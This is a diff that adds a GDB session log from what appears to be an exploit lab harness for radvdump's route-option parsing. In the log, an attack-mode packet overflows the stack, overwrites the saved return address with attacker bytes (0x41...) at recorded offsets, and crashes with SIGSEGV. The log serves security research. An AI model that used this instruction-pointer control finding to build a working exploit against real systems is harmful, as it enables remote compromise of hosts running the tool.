@@ -1,0 +1,32 @@
+Breakpoint 1 at 0x16a4: file /home/mesh-home/mishe-tauftauf2shell/lab/frontier/radvdump2shell/harness/radvdump.c.878ca6b, line 381.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+ENTER_ROUTE_CASE ri_len=33 optlen=264 orig_len=264
+
+Breakpoint 1, route_case (total_len=280) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/radvdump2shell/harness/radvdump.c.878ca6b:381
+warning: 381	/home/mesh-home/mishe-tauftauf2shell/lab/frontier/radvdump2shell/harness/radvdump.c.878ca6b: No such file or directory
+Stack level 0, frame at 0x7fffffffe100:
+ rip = 0x5555555556a4 in route_case (/home/mesh-home/mishe-tauftauf2shell/lab/frontier/radvdump2shell/harness/radvdump.c.878ca6b:381); saved rip = 0x414141414141417b
+ called by frame at 0x7fffffffe108
+ source language c.
+ Arglist at 0x7fffffffe0f0, args: total_len=280
+ Locals at 0x7fffffffe0f0, Previous frame's sp is 0x7fffffffe100
+ Saved registers:
+  rbp at 0x7fffffffe0f0, rip at 0x7fffffffe0f8
+0x7fffffffe0d0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe0d8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe0e0:	0x41	0x5a	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe0e8:	0x7a	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe0f0:	0x41	0x3c	0x41	0x41	0x41	0x41	0x41	0x41
+
+VARIANT=vuln-878ca6b MODE=attack RI_LEN=33 OPTLEN=264 PKT_LEN=280
+FLOG_CALLS=0 ADDRTOSTR_CALLS=1
+ADDR_FIRST16=41414141414141414141414141414141
+OBS_OFFSET_0=41 OBS_OFFSET_17=5a OBS_OFFSET_24=7a OBS_OFFSET_33=3c OBS_OFFSET_40=7b OBS_OFFSET_63=7e
+READY
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00005555555556c3 in route_case (total_len=280) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/radvdump2shell/harness/radvdump.c.878ca6b:382
+382	in /home/mesh-home/mishe-tauftauf2shell/lab/frontier/radvdump2shell/harness/radvdump.c.878ca6b
+#0  0x00005555555556c3 in route_case (total_len=280) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/radvdump2shell/harness/radvdump.c.878ca6b:382
+#1  0x414141414141417b in ?? ()
